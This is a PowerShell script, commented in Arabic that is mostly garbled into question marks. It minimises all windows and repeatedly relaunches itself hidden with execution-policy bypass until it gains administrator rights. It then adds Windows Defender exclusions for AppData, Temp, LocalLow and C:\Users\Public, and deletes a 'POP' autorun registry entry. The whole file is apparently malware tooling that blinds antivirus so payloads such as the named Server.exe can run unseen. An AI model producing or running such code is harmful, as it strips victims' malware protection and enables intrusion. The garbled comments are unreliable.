# ????? ???? ???????
$Shell = New-Object -ComObject "Shell.Application"
$Shell.MinimizeAll()

# ????? ??? ??????? ??????? 10 ????
for ($i = 1; $i -le 13; $i++)
{
	if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
	{
		Start-Process PowerShell -WindowStyle Hidden -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`""
		Start-Sleep -Seconds 0 # ?????? ???? ??? ???????
	}
	else
	{
		break # ?????? ?? ?????? ??? ?????? ??? ?????????
	}
}

# ??? ?????? ??? ??????? ???????? ?????? ?? ??????? ?? ???????????
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
	try
	{
		# ????? 10 ?????? ???????????
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData" # استثناء مجلد المستخدم الحالي
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData" # استثناء ملف Server.exe
	Add-MpPreference -ExclusionPath "C:\Users\Public" # استثناء مجلد على سطح المكتب
	Add-MpPreference -ExclusionPath "C:\Users\Public" # استثناء مجلد برنامج
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming" # استثناء مجلد مشترك
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local" # استثناء ملف Project.exe في المستندات
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData" # استثناء ملف Backup.exe على قرص D
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" # استثناء ملف Installer.exe في مجلد التنزيلات
	Add-MpPreference -ExclusionPath "$env:TEMP" # استثناء مجلد Temp
	Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\LocalLow" # استثناء مجلد بيانات عام
	}
	catch
	{
		Write-Error "??? ????? ????? ???????????: $_"
	}
	
	# ??? ????? "POP" ?? ???????? ?? ??? ?? ?????? ??? ??????? ???????
	try
	{
		Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "POP"
	}
	catch
	{
		Write-Error "??? ????? ??? ????? 'POP' ?? ????????: $_"
	}
}
